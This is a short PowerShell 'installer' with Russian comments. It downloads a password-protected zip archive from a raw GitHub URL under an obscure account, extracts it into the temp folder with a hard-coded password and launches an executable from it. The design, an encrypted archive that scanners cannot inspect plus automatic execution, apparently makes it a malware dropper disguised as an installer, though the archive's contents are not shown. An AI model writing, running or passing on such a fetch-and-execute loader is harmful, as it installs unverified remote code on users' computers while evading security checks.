# =============================================
# Installer by v25888656-maker
# =============================================

param(
    [string]$Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip",
    [string]$Password = "5357",                    # Пароль от архива
    [string]$FileToOpen = ""                       # ← Укажи имя файла для запуска (например: check.exe)
)

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath  = "$env:TEMP\check_extracted"

Write-Host "[+] Создаём папку..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null

Write-Host "[+] Скачиваем check.zip..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing
    Write-Host "[+] Скачано" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка скачивания" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Распаковываем архив..." -ForegroundColor Cyan
$7z = "C:\Program Files\7-Zip\7z.exe"

if (Test-Path $7z) {
    & $7z x "$DownloadPath" -o"$ExtractPath" -p"$Password" -y -bso0
} else {
    Write-Host "[-] 7-Zip не найден!" -ForegroundColor Red
    exit 1
}

# Запуск файла
if ($FileToOpen) {
    $FullPath = Join-Path $ExtractPath $FileToOpen
    if (Test-Path $FullPath) {
        Write-Host "[+] Запускаем $FileToOpen ..." -ForegroundColor Green
        Start-Process $FullPath
    } else {
        Write-Host "[-] Файл не найден, открываю папку..." -ForegroundColor Yellow
        explorer $ExtractPath
    }
} else {
    explorer $ExtractPath
}

Write-Host "[+] Готово!" -ForegroundColor Green
